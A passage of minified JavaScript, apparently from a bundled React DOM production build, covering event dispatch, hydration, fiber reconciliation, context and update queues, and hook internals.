k(d,u+"enter",w,n,f),k.target=p,k.relatedTarget=F,v=k),F=v,S&&w)t:{for(k=S,d=w,u=0,p=k;p;p=Dt(p))u++;for(p=0,v=d;v;v=Dt(v))p++;for(;0<u-p;)k=Dt(k),u--;for(;0<p-u;)d=Dt(d),p--;for(;u--;){if(k===d||d!==null&&k===d.alternate)break t;k=Dt(k),d=Dt(d)}k=null}else k=null;S!==null&&fs(m,h,S,k,!1),w!==null&&F!==null&&fs(m,F,w,k,!0)}}e:{if(h=c?Ht(c):window,S=h.nodeName&&h.nodeName.toLowerCase(),S==="select"||S==="input"&&h.type==="file")var x=Fd;else if(os(h))if(Va)x=Wd;else{x=Hd;var E=zd}else(S=h.nodeName)&&S.toLowerCase()==="input"&&(h.type==="checkbox"||h.type==="radio")&&(x=Ud);if(x&&(x=x(e,c))){Ba(m,x,n,f);break e}E&&E(e,h,c),e==="focusout"&&(E=h._wrapperState)&&E.controlled&&h.type==="number"&&nl(h,"number",h.value)}switch(E=c?Ht(c):window,e){case"focusin":(os(E)||E.contentEditable==="true")&&(Ft=E,ml=c,jn=null);break;case"focusout":jn=ml=Ft=null;break;case"mousedown":hl=!0;break;case"contextmenu":case"mouseup":case"dragend":hl=!1,us(m,n,f);break;case"selectionchange":if(bd)break;case"keydown":case"keyup":us(m,n,f)}var P;if(ii)e:{switch(e){case"compositionstart":var j="onCompositionStart";break e;case"compositionend":j="onCompositionEnd";break e;case"compositionupdate":j="onCompositionUpdate";break e}j=void 0}else _t?Ua(e,n)&&(j="onCompositionEnd"):e==="keydown"&&n.keyCode===229&&(j="onCompositionStart");j&&(Ha&&n.locale!=="ko"&&(_t||j!=="onCompositionStart"?j==="onCompositionEnd"&&_t&&(P=za()):(nt=f,ri="value"in nt?nt.value:nt.textContent,_t=!0)),E=zr(c,j),0<E.length&&(j=new es(j,e,null,n,f),m.push({event:j,listeners:E}),P?j.data=P:(P=Wa(n),P!==null&&(j.data=P)))),(P=Ld?Dd(e,n):Id(e,n))&&(c=zr(c,"onBeforeInput"),0<c.length&&(f=new es("onBeforeInput","beforeinput",null,n,f),m.push({event:f,listeners:c}),f.data=P))}Za(m,t)})}function Wn(e,t,n){return{instance:e,listener:t,currentTarget:n}}function zr(e,t){for(var n=t+"Capture",r=[];e!==null;){var o=e,l=o.stateNode;o.tag===5&&l!==null&&(o=l,l=In(e,n),l!=null&&r.unshift(Wn(e,l,o)),l=In(e,t),l!=null&&r.push(Wn(e,l,o))),e=e.return}return r}function Dt(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function fs(e,t,n,r,o){for(var l=t._reactName,i=[];n!==null&&n!==r;){var s=n,a=s.alternate,c=s.stateNode;if(a!==null&&a===r)break;s.tag===5&&c!==null&&(s=c,o?(a=In(n,l),a!=null&&i.unshift(Wn(n,a,s))):o||(a=In(n,l),a!=null&&i.push(Wn(n,a,s)))),n=n.return}i.length!==0&&e.push({event:t,listeners:i})}var Kd=/\r\n?/g,Qd=/\u0000|\uFFFD/g;function ps(e){return(typeof e=="string"?e:""+e).replace(Kd,`
`).replace(Qd,"")}function fr(e,t,n){if(t=ps(t),ps(e)!==t&&n)throw Error(y(425))}function Hr(){}var gl=null,vl=null;function yl(e,t){return e==="textarea"||e==="noscript"||typeof t.children=="string"||typeof t.children=="number"||typeof t.dangerouslySetInnerHTML=="object"&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var Sl=typeof setTimeout=="function"?setTimeout:void 0,Xd=typeof clearTimeout=="function"?clearTimeout:void 0,ms=typeof Promise=="function"?Promise:void 0,Yd=typeof queueMicrotask=="function"?queueMicrotask:typeof ms<"u"?function(e){return ms.resolve(null).then(e).catch(qd)}:Sl;function qd(e){setTimeout(function(){throw e})}function zo(e,t){var n=t,r=0;do{var o=n.nextSibling;if(e.removeChild(n),o&&o.nodeType===8)if(n=o.data,n==="/$"){if(r===0){e.removeChild(o),Fn(t);return}r--}else n!=="$"&&n!=="$?"&&n!=="$!"||r++;n=o}while(n);Fn(t)}function st(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t==="$"||t==="$!"||t==="$?")break;if(t==="/$")return null}}return e}function hs(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var n=e.data;if(n==="$"||n==="$!"||n==="$?"){if(t===0)return e;t--}else n==="/$"&&t++}e=e.previousSibling}return null}var an=Math.random().toString(36).slice(2),Fe="__reactFiber$"+an,Bn="__reactProps$"+an,$e="__reactContainer$"+an,wl="__reactEvents$"+an,Zd="__reactListeners$"+an,ef="__reactHandles$"+an;function kt(e){var t=e[Fe];if(t)return t;for(var n=e.parentNode;n;){if(t=n[$e]||n[Fe]){if(n=t.alternate,t.child!==null||n!==null&&n.child!==null)for(e=hs(e);e!==null;){if(n=e[Fe])return n;e=hs(e)}return t}e=n,n=e.parentNode}return null}function qn(e){return e=e[Fe]||e[$e],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function Ht(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(y(33))}function so(e){return e[Bn]||null}var kl=[],Ut=-1;function ht(e){return{current:e}}function _(e){0>Ut||(e.current=kl[Ut],kl[Ut]=null,Ut--)}function I(e,t){Ut++,kl[Ut]=e.current,e.current=t}var pt={},oe=ht(pt),fe=ht(!1),Pt=pt;function Zt(e,t){var n=e.type.contextTypes;if(!n)return pt;var r=e.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===t)return r.__reactInternalMemoizedMaskedChildContext;var o={},l;for(l in n)o[l]=t[l];return r&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=t,e.__reactInternalMemoizedMaskedChildContext=o),o}function pe(e){return e=e.childContextTypes,e!=null}function Ur(){_(fe),_(oe)}function gs(e,t,n){if(oe.current!==pt)throw Error(y(168));I(oe,t),I(fe,n)}function tu(e,t,n){var r=e.stateNode;if(t=t.childContextTypes,typeof r.getChildContext!="function")return n;r=r.getChildContext();for(var o in r)if(!(o in t))throw Error(y(108,zc(e)||"Unknown",o));return W({},n,r)}function Wr(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||pt,Pt=oe.current,I(oe,e),I(fe,fe.current),!0}function vs(e,t,n){var r=e.stateNode;if(!r)throw Error(y(169));n?(e=tu(e,t,Pt),r.__reactInternalMemoizedMergedChildContext=e,_(fe),_(oe),I(oe,e)):_(fe),I(fe,n)}var We=null,ao=!1,Ho=!1;function nu(e){We===null?We=[e]:We.push(e)}function tf(e){ao=!0,nu(e)}function gt(){if(!Ho&&We!==null){Ho=!0;var e=0,t=D;try{var n=We;for(D=1;e<n.length;e++){var r=n[e];do r=r(!0);while(r!==null)}We=null,ao=!1}catch(o){throw We!==null&&(We=We.slice(e+1)),ja(Zl,gt),o}finally{D=t,Ho=!1}}return null}var Wt=[],Bt=0,Br=null,Vr=0,ke=[],Ce=0,jt=null,Be=1,Ve="";function St(e,t){Wt[Bt++]=Vr,Wt[Bt++]=Br,Br=e,Vr=t}function ru(e,t,n){ke[Ce++]=Be,ke[Ce++]=Ve,ke[Ce++]=jt,jt=e;var r=Be;e=Ve;var o=32-Le(r)-1;r&=~(1<<o),n+=1;var l=32-Le(t)+o;if(30<l){var i=o-o%5;l=(r&(1<<i)-1).toString(32),r>>=i,o-=i,Be=1<<32-Le(t)+o|n<<o|r,Ve=l+e}else Be=1<<l|n<<o|r,Ve=e}function ai(e){e.return!==null&&(St(e,1),ru(e,1,0))}function ui(e){for(;e===Br;)Br=Wt[--Bt],Wt[Bt]=null,Vr=Wt[--Bt],Wt[Bt]=null;for(;e===jt;)jt=ke[--Ce],ke[Ce]=null,Ve=ke[--Ce],ke[Ce]=null,Be=ke[--Ce],ke[Ce]=null}var ve=null,ge=null,z=!1,Oe=null;function ou(e,t){var n=xe(5,null,null,0);n.elementType="DELETED",n.stateNode=t,n.return=e,t=e.deletions,t===null?(e.deletions=[n],e.flags|=16):t.push(n)}function ys(e,t){switch(e.tag){case 5:var n=e.type;return t=t.nodeType!==1||n.toLowerCase()!==t.nodeName.toLowerCase()?null:t,t!==null?(e.stateNode=t,ve=e,ge=st(t.firstChild),!0):!1;case 6:return t=e.pendingProps===""||t.nodeType!==3?null:t,t!==null?(e.stateNode=t,ve=e,ge=null,!0):!1;case 13:return t=t.nodeType!==8?null:t,t!==null?(n=jt!==null?{id:Be,overflow:Ve}:null,e.memoizedState={dehydrated:t,treeContext:n,retryLane:1073741824},n=xe(18,null,null,0),n.stateNode=t,n.return=e,e.child=n,ve=e,ge=null,!0):!1;default:return!1}}function Cl(e){return(e.mode&1)!==0&&(e.flags&128)===0}function xl(e){if(z){var t=ge;if(t){var n=t;if(!ys(e,t)){if(Cl(e))throw Error(y(418));t=st(n.nextSibling);var r=ve;t&&ys(e,t)?ou(r,n):(e.flags=e.flags&-4097|2,z=!1,ve=e)}}else{if(Cl(e))throw Error(y(418));e.flags=e.flags&-4097|2,z=!1,ve=e}}}function Ss(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;ve=e}function pr(e){if(e!==ve)return!1;if(!z)return Ss(e),z=!0,!1;var t;if((t=e.tag!==3)&&!(t=e.tag!==5)&&(t=e.type,t=t!=="head"&&t!=="body"&&!yl(e.type,e.memoizedProps)),t&&(t=ge)){if(Cl(e))throw lu(),Error(y(418));for(;t;)ou(e,t),t=st(t.nextSibling)}if(Ss(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(y(317));e:{for(e=e.nextSibling,t=0;e;){if(e.nodeType===8){var n=e.data;if(n==="/$"){if(t===0){ge=st(e.nextSibling);break e}t--}else n!=="$"&&n!=="$!"&&n!=="$?"||t++}e=e.nextSibling}ge=null}}else ge=ve?st(e.stateNode.nextSibling):null;return!0}function lu(){for(var e=ge;e;)e=st(e.nextSibling)}function en(){ge=ve=null,z=!1}function ci(e){Oe===null?Oe=[e]:Oe.push(e)}var nf=Qe.ReactCurrentBatchConfig;function gn(e,t,n){if(e=n.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(n._owner){if(n=n._owner,n){if(n.tag!==1)throw Error(y(309));var r=n.stateNode}if(!r)throw Error(y(147,e));var o=r,l=""+e;return t!==null&&t.ref!==null&&typeof t.ref=="function"&&t.ref._stringRef===l?t.ref:(t=function(i){var s=o.refs;i===null?delete s[l]:s[l]=i},t._stringRef=l,t)}if(typeof e!="string")throw Error(y(284));if(!n._owner)throw Error(y(290,e))}return e}function mr(e,t){throw e=Object.prototype.toString.call(t),Error(y(31,e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e))}function ws(e){var t=e._init;return t(e._payload)}function iu(e){function t(d,u){if(e){var p=d.deletions;p===null?(d.deletions=[u],d.flags|=16):p.push(u)}}function n(d,u){if(!e)return null;for(;u!==null;)t(d,u),u=u.sibling;return null}function r(d,u){for(d=new Map;u!==null;)u.key!==null?d.set(u.key,u):d.set(u.index,u),u=u.sibling;return d}function o(d,u){return d=dt(d,u),d.index=0,d.sibling=null,d}function l(d,u,p){return d.index=p,e?(p=d.alternate,p!==null?(p=p.index,p<u?(d.flags|=2,u):p):(d.flags|=2,u)):(d.flags|=1048576,u)}function i(d){return e&&d.alternate===null&&(d.flags|=2),d}function s(d,u,p,v){return u===null||u.tag!==6?(u=$o(p,d.mode,v),u.return=d,u):(u=o(u,p),u.return=d,u)}function a(d,u,p,v){var x=p.type;return x===At?f(d,u,p.props.children,v,p.key):u!==null&&(u.elementType===x||typeof x=="object"&&x!==null&&x.$$typeof===qe&&ws(x)===u.type)?(v=o(u,p.props),v.ref=gn(d,u,p),v.return=d,v):(v=Mr(p.type,p.key,p.props,null,d.mode,v),v.ref=gn(d,u,p),v.return=d,v)}function c(d,u,p,v){return u===null||u.tag!==4||u.stateNode.containerInfo!==p.containerInfo||u.stateNode.implementation!==p.implementation?(u=Go(p,d.mode,v),u.return=d,u):(u=o(u,p.children||[]),u.return=d,u)}function f(d,u,p,v,x){return u===null||u.tag!==7?(u=Et(p,d.mode,v,x),u.return=d,u):(u=o(u,p),u.return=d,u)}function m(d,u,p){if(typeof u=="string"&&u!==""||typeof u=="number")return u=$o(""+u,d.mode,p),u.return=d,u;if(typeof u=="object"&&u!==null){switch(u.$$typeof){case rr:return p=Mr(u.type,u.key,u.props,null,d.mode,p),p.ref=gn(d,null,u),p.return=d,p;case It:return u=Go(u,d.mode,p),u.return=d,u;case qe:var v=u._init;return m(d,v(u._payload),p)}if(wn(u)||dn(u))return u=Et(u,d.mode,p,null),u.return=d,u;mr(d,u)}return null}function h(d,u,p,v){var x=u!==null?u.key:null;if(typeof p=="string"&&p!==""||typeof p=="number")return x!==null?null:s(d,u,""+p,v);if(typeof p=="object"&&p!==null){switch(p.$$typeof){case rr:return p.key===x?a(d,u,p,v):null;case It:return p.key===x?c(d,u,p,v):null;case qe:return x=p._init,h(d,u,x(p._payload),v)}if(wn(p)||dn(p))return x!==null?null:f(d,u,p,v,null);mr(d,p)}return null}function S(d,u,p,v,x){if(typeof v=="string"&&v!==""||typeof v=="number")return d=d.get(p)||null,s(u,d,""+v,x);if(typeof v=="object"&&v!==null){switch(v.$$typeof){case rr:return d=d.get(v.key===null?p:v.key)||null,a(u,d,v,x);case It:return d=d.get(v.key===null?p:v.key)||null,c(u,d,v,x);case qe:var E=v._init;return S(d,u,p,E(v._payload),x)}if(wn(v)||dn(v))return d=d.get(p)||null,f(u,d,v,x,null);mr(u,v)}return null}function w(d,u,p,v){for(var x=null,E=null,P=u,j=u=0,V=null;P!==null&&j<p.length;j++){P.index>j?(V=P,P=null):V=P.sibling;var O=h(d,P,p[j],v);if(O===null){P===null&&(P=V);break}e&&P&&O.alternate===null&&t(d,P),u=l(O,u,j),E===null?x=O:E.sibling=O,E=O,P=V}if(j===p.length)return n(d,P),z&&St(d,j),x;if(P===null){for(;j<p.length;j++)P=m(d,p[j],v),P!==null&&(u=l(P,u,j),E===null?x=P:E.sibling=P,E=P);return z&&St(d,j),x}for(P=r(d,P);j<p.length;j++)V=S(P,d,j,p[j],v),V!==null&&(e&&V.alternate!==null&&P.delete(V.key===null?j:V.key),u=l(V,u,j),E===null?x=V:E.sibling=V,E=V);return e&&P.forEach(function(je){return t(d,je)}),z&&St(d,j),x}function k(d,u,p,v){var x=dn(p);if(typeof x!="function")throw Error(y(150));if(p=x.call(p),p==null)throw Error(y(151));for(var E=x=null,P=u,j=u=0,V=null,O=p.next();P!==null&&!O.done;j++,O=p.next()){P.index>j?(V=P,P=null):V=P.sibling;var je=h(d,P,O.value,v);if(je===null){P===null&&(P=V);break}e&&P&&je.alternate===null&&t(d,P),u=l(je,u,j),E===null?x=je:E.sibling=je,E=je,P=V}if(O.done)return n(d,P),z&&St(d,j),x;if(P===null){for(;!O.done;j++,O=p.next())O=m(d,O.value,v),O!==null&&(u=l(O,u,j),E===null?x=O:E.sibling=O,E=O);return z&&St(d,j),x}for(P=r(d,P);!O.done;j++,O=p.next())O=S(P,d,j,O.value,v),O!==null&&(e&&O.alternate!==null&&P.delete(O.key===null?j:O.key),u=l(O,u,j),E===null?x=O:E.sibling=O,E=O);return e&&P.forEach(function(un){return t(d,un)}),z&&St(d,j),x}function F(d,u,p,v){if(typeof p=="object"&&p!==null&&p.type===At&&p.key===null&&(p=p.props.children),typeof p=="object"&&p!==null){switch(p.$$typeof){case rr:e:{for(var x=p.key,E=u;E!==null;){if(E.key===x){if(x=p.type,x===At){if(E.tag===7){n(d,E.sibling),u=o(E,p.props.children),u.return=d,d=u;break e}}else if(E.elementType===x||typeof x=="object"&&x!==null&&x.$$typeof===qe&&ws(x)===E.type){n(d,E.sibling),u=o(E,p.props),u.ref=gn(d,E,p),u.return=d,d=u;break e}n(d,E);break}else t(d,E);E=E.sibling}p.type===At?(u=Et(p.props.children,d.mode,v,p.key),u.return=d,d=u):(v=Mr(p.type,p.key,p.props,null,d.mode,v),v.ref=gn(d,u,p),v.return=d,d=v)}return i(d);case It:e:{for(E=p.key;u!==null;){if(u.key===E)if(u.tag===4&&u.stateNode.containerInfo===p.containerInfo&&u.stateNode.implementation===p.implementation){n(d,u.sibling),u=o(u,p.children||[]),u.return=d,d=u;break e}else{n(d,u);break}else t(d,u);u=u.sibling}u=Go(p,d.mode,v),u.return=d,d=u}return i(d);case qe:return E=p._init,F(d,u,E(p._payload),v)}if(wn(p))return w(d,u,p,v);if(dn(p))return k(d,u,p,v);mr(d,p)}return typeof p=="string"&&p!==""||typeof p=="number"?(p=""+p,u!==null&&u.tag===6?(n(d,u.sibling),u=o(u,p),u.return=d,d=u):(n(d,u),u=$o(p,d.mode,v),u.return=d,d=u),i(d)):n(d,u)}return F}var tn=iu(!0),su=iu(!1),br=ht(null),Jr=null,Vt=null,di=null;function fi(){di=Vt=Jr=null}function pi(e){var t=br.current;_(br),e._currentValue=t}function Tl(e,t,n){for(;e!==null;){var r=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,r!==null&&(r.childLanes|=t)):r!==null&&(r.childLanes&t)!==t&&(r.childLanes|=t),e===n)break;e=e.return}}function Xt(e,t){Jr=e,di=Vt=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&t&&(de=!0),e.firstContext=null)}function Ee(e){var t=e._currentValue;if(di!==e)if(e={context:e,memoizedValue:t,next:null},Vt===null){if(Jr===null)throw Error(y(308));Vt=e,Jr.dependencies={lanes:0,firstContext:e}}else Vt=Vt.next=e;return t}var Ct=null;function mi(e){Ct===null?Ct=[e]:Ct.push(e)}function au(e,t,n,r){var o=t.interleaved;return o===null?(n.next=n,mi(t)):(n.next=o.next,o.next=n),t.interleaved=n,Ge(e,r)}function Ge(e,t){e.lanes|=t;var n=e.alternate;for(n!==null&&(n.lanes|=t),n=e,e=e.return;e!==null;)e.childLanes|=t,n=e.alternate,n!==null&&(n.childLanes|=t),n=e,e=e.return;return n.tag===3?n.stateNode:null}var Ze=!1;function hi(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function uu(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function be(e,t){return{eventTime:e,lane:t,tag:0,payload:null,callback:null,next:null}}function at(e,t,n){var r=e.updateQueue;if(r===null)return null;if(r=r.shared,L&2){var o=r.pending;return o===null?t.next=t:(t.next=o.next,o.next=t),r.pending=t,Ge(e,n)}return o=r.interleaved,o===null?(t.next=t,mi(r)):(t.next=o.next,o.next=t),r.interleaved=t,Ge(e,n)}function Tr(e,t,n){if(t=t.updateQueue,t!==null&&(t=t.shared,(n&4194240)!==0)){var r=t.lanes;r&=e.pendingLanes,n|=r,t.lanes=n,ei(e,n)}}function ks(e,t){var n=e.updateQueue,r=e.alternate;if(r!==null&&(r=r.updateQueue,n===r)){var o=null,l=null;if(n=n.firstBaseUpdate,n!==null){do{var i={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};l===null?o=l=i:l=l.next=i,n=n.next}while(n!==null);l===null?o=l=t:l=l.next=t}else o=l=t;n={baseState:r.baseState,firstBaseUpdate:o,lastBaseUpdate:l,shared:r.shared,effects:r.effects},e.updateQueue=n;return}e=n.lastBaseUpdate,e===null?n.firstBaseUpdate=t:e.next=t,n.lastBaseUpdate=t}function $r(e,t,n,r){var o=e.updateQueue;Ze=!1;var l=o.firstBaseUpdate,i=o.lastBaseUpdate,s=o.shared.pending;if(s!==null){o.shared.pending=null;var a=s,c=a.next;a.next=null,i===null?l=c:i.next=c,i=a;var f=e.alternate;f!==null&&(f=f.updateQueue,s=f.lastBaseUpdate,s!==i&&(s===null?f.firstBaseUpdate=c:s.next=c,f.lastBaseUpdate=a))}if(l!==null){var m=o.baseState;i=0,f=c=a=null,s=l;do{var h=s.lane,S=s.eventTime;if((r&h)===h){f!==null&&(f=f.next={eventTime:S,lane:0,tag:s.tag,payload:s.payload,callback:s.callback,next:null});e:{var w=e,k=s;switch(h=t,S=n,k.tag){case 1:if(w=k.payload,typeof w=="function"){m=w.call(S,m,h);break e}m=w;break e;case 3:w.flags=w.flags&-65537|128;case 0:if(w=k.payload,h=typeof w=="function"?w.call(S,m,h):w,h==null)break e;m=W({},m,h);break e;case 2:Ze=!0}}s.callback!==null&&s.lane!==0&&(e.flags|=64,h=o.effects,h===null?o.effects=[s]:h.push(s))}else S={eventTime:S,lane:h,tag:s.tag,payload:s.payload,callback:s.callback,next:null},f===null?(c=f=S,a=m):f=f.next=S,i|=h;if(s=s.next,s===null){if(s=o.shared.pending,s===null)break;h=s,s=h.next,h.next=null,o.lastBaseUpdate=h,o.shared.pending=null}}while(!0);if(f===null&&(a=m),o.baseState=a,o.firstBaseUpdate=c,o.lastBaseUpdate=f,t=o.shared.interleaved,t!==null){o=t;do i|=o.lane,o=o.next;while(o!==t)}else l===null&&(o.shared.lanes=0);Nt|=i,e.lanes=i,e.memoizedState=m}}function Cs(e,t,n){if(e=t.effects,t.effects=null,e!==null)for(t=0;t<e.length;t++){var r=e[t],o=r.callback;if(o!==null){if(r.callback=null,r=n,typeof o!="function")throw Error(y(191,o));o.call(r)}}}var Zn={},He=ht(Zn),Vn=ht(Zn),bn=ht(Zn);function xt(e){if(e===Zn)throw Error(y(174));return e}function gi(e,t){switch(I(bn,t),I(Vn,e),I(He,Zn),e=t.nodeType,e){case 9:case 11:t=(t=t.documentElement)?t.namespaceURI:ol(null,"");break;default:e=e===8?t.parentNode:t,t=e.namespaceURI||null,e=e.tagName,t=ol(t,e)}_(He),I(He,t)}function nn(){_(He),_(Vn),_(bn)}function cu(e){xt(bn.current);var t=xt(He.current),n=ol(t,e.type);t!==n&&(I(Vn,e),I(He,n))}function vi(e){Vn.current===e&&(_(He),_(Vn))}var H=ht(0);function Gr(e){for(var t=e;t!==null;){if(t.tag===13){var n=t.memoizedState;if(n!==null&&(n=n.dehydrated,n===null||n.data==="$?"||n.data==="$!"))return t}else if(t.tag===19&&t.memoizedProps.revealOrder!==void 0){if(t.flags&128)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var Uo=[];function yi(){for(var e=0;e<Uo.length;e++)Uo[e]._workInProgressVersionPrimary=null;Uo.length=0}var Er=Qe.ReactCurrentDispatcher,Wo=Qe.ReactCurrentBatchConfig,Rt=0,U=null,G=null,X=null,Kr=!1,Rn=!1,Jn=0,rf=0;function te(){throw Error(y(321))}function Si(e,t){if(t===null)return!1;for(var n=0;n<t.length&&n<e.length;n++)if(!Ie(e[n],t[n]))return!1;return!0}function wi(e,t,n,r,o,l){if(Rt=l,U=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,Er.current=e===null||e.memoizedState===null?af:uf,e=n(r,o),Rn){l=0;do{if(Rn=!1,Jn=0,25<=l)throw Error(y(301));l+=1,X=G=null,t.updateQueue=null,Er.current=cf,e=n(r,o)}while(Rn)}if(Er.current=Qr,t=G!==null&&G.next!==null,Rt=0,X=G=U=null,Kr=!1,t)throw Error(y(300));return e}function ki(){var e=Jn!==0;return Jn=0,e}function _e(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return X===null?U.memoizedState=X=e:X=X.next=e,X}function Pe(){if(G===null){var e=U.alternate;e=e!==null?e.memoizedState:null}else e=G.next;var t=X===null?U.memoizedState:X.next;if(t!==null)X=t,G=e;else{if(e===null)throw Error(y(310));G=e,e={memoizedState:G.memoizedState,baseState:G.baseState,baseQueue:G.baseQueue,queue:G.queue,next:null},X===null?U.memoizedState=X=e:X=X.next=e}return X}function $n(e,t){return typeof t=="function"?t(e):t}function Bo(e){var t=Pe(),n=t.queue;if(n===null)throw Error(y(311));n.lastRenderedReducer=e;var r=G,o=r.baseQueue,l=n.pending;if(l!==null){if(o!==null){var i=o.next;o.next=l.next,l.next=i}r.baseQueue=o=l,n.pending=null}if(o!==null){l=o.next,r=r.baseState;var s=i=null,a=null,c=l;do{var f=c.lane;if((Rt&f)===f)a!==null&&(a=a.next={lane:0,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null}),r=c.hasEagerState?c.eagerState:e(r,c.action);else{var m={lane:f,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null};a===null?(s=a=m,i=r):a=a.next=m,U.lanes|=f,Nt|=f}c=c.next}while(c!==null&&c!==l);a===null?i=r:a.next=s,Ie(r,t.memoizedState)||(de=!0),t.memoizedState=r,t.baseState=i,t.baseQueue=a,n.lastRenderedState=r}if(e=n.interleaved,e!==null){o=e;do l=o.lane,U.lanes|=l,Nt|=l,o=o.next;while(o!==e)}else o===null&&(n.lanes=0);return[t.memoizedState,n.dispatch]}function Vo(e){var t=Pe(),n=t.queue;if(n===null)throw Error(y(311));n.lastRenderedReducer=e;var r=n.dispatch,o=n.pending,l=t.memoizedState;if(o!==null){n.pending=null;var i=o=o.next;do l=e(l,i.action),i=i.next;while(i!==o);Ie(l,t.memoizedState)||(de=!0),t.memoizedState=l,t.baseQueue===null&&(t.baseState=l),n.lastRenderedState=l}return[l,r]}function du(){}function fu(e,t){var n=U,r=Pe(),o=t(),l=!Ie(r.memoizedState,o);if(l&&(r.memoizedState=o,de=!0),r=r.queue,Ci(hu.bind(null,n,r,e),[e]),r.getSnapshot!==t||l||X!==null&&X.memoizedState.tag&1){if(n.flags|=2048,Gn(9,mu.bind(null,n,r,o,t),void 0,null),Y===null)throw Error(y(349));Rt&30||pu(n,t,o)}return o}function pu(e,t,n){e.flags|=16384,e={getSnapshot:t,value:n},t=U.updateQueue,t===null?(t={lastEffect:null,stores:null},U.updateQueue=t,t.stores=[e]):(n=t.stores,n===null?t.stores=[e]:n.push(e))}function mu(e,t,n,r){t.value=n,t.getSnapshot=r,gu(t)&&vu(e)}function hu(e,t,n){return n(function(){gu(t)&&vu(e)})}function gu(e){var t=e.getSnapshot;e=e.value;try{var n=t();return!Ie(e,n)}catch{return!0}}function vu(e){var t=Ge(e,1);t!==null&&De(t,e,1,-1)}function xs(e){var t=_e();return typeof e=="function"&&(e=e()),t.memoizedState=t.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:$n,lastRenderedState:e},t.queue=e,e=e.dispatch=sf.bind(null,U,e),[t.memoizedState,e]}function Gn(e,t,n,r){return e={tag:e,create:t,destroy:n,deps:r,next:null},t=U.updateQueue,t===null?(t={lastEffect:null,stores:null},U.updateQueue=t,t.lastEffect=e.next=e):(n=t.lastEffect,n===null?t.lastEffect=e.next=e:(r=n.next,n.next=e,e.next=r,t.lastEffect=e)),e}function yu(){return Pe().memoizedState}function Pr(e,t,n,r){var o=_e();U.flags|=e,o.memoizedState=Gn(1|t,n,void 0,r===void 0?null:r)}function uo(e,t,n,r){var o=Pe();r=r===void 0?null:r;var l=void 0;if(G!==null){var i=G.memoizedState;if(l=i.destroy,r!==null&&Si(r,i.deps)){o.memoizedState=Gn(t,n,l,r);return}}U.flags|=e,o.memoizedState=Gn(1|t,n,l,r)}function Ts(e,t){return Pr(8390656,8,e,t)}function Ci(e,t){return uo(2048,8,e,t)}function Su(e,t){return uo(4,2,e,t)}function wu(e,t){return uo(4,4,e,t)}function ku(e,t){if(typeof t=="function")return e=e(),t(e),function(){t(null)};if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function Cu(e,t,n){return n=n!=null?n.concat([e]):null,uo(4,4,ku.bind(null,t,e),n)}function xi(){}function xu(e,t){var n=Pe();t=t===void 0?null:t;var r=n.memoizedState;return r!==null&&t!==null&&Si(t,r[1])?r[0]:(n.memoizedState=[e,t],e)}function Tu(e,t){var n=Pe();t=t===void 0?null:t;var r=n.memoizedState;return r!==null&&t!==null&&Si(t,r[1])?r[0]:(e=e(),n.memoizedState=[e,t],e)}function Eu(e,t,n){return Rt&21?(Ie(n,t)||(n=Ma(),U.lanes|=n,Nt|=n,e.baseState=!0),t):(e.baseState&&(e.baseState=!1,de=!0),e.memoizedState=n)}function of(e,t){var n=D;D=n!==0&&4>n?n:4,e(!0);var r=Wo.transition;Wo.transition={};try{e(!1),t()}finally{D=n,Wo.transition=r}}function Pu(){return Pe().memoizedState}function lf(e,t,n){var r=ct(e);if(n={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null},ju(e))Ru(t,n);else if(n=au(e,t,n,r),n!==null){var o=ie();De(n,e,r,o),Nu(n,t,r)}}function sf(e,t,n){var r=ct(e),o={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null};if(ju(e))Ru(t,o);else{var l=e.alternate;if(e.lanes===0&&(l===null||l.lanes===0)&&(l=t.lastRenderedReducer,l!==null))try{var i=t.lastRenderedState,s=l(i,n);if(o.hasEagerState=!0,o.eagerState=s,Ie(s,i)){var a=t.interleaved;a===null?(o.next=o,mi(t)):(o.next=a.next,a.next=o),t.interleaved=o;return}}catch{}finally{}n=au(e,t,o,r),n!==null&&(o=ie(),De(n,e,r,o),Nu(n,t,r))}}function ju(e){var t=e.alternate;return e===U||t!==null&&t===U}function Ru(e,t){Rn=Kr=!0;var n=e.pending;n===null?t.next=t:(t.next=n.next,n.next=t),e.pending=t}function Nu(e,t,n){if(n&4194240){var r=t.lanes;r&=e.pendingLanes,n|=r,t.lanes=n,ei(e,n)}}var 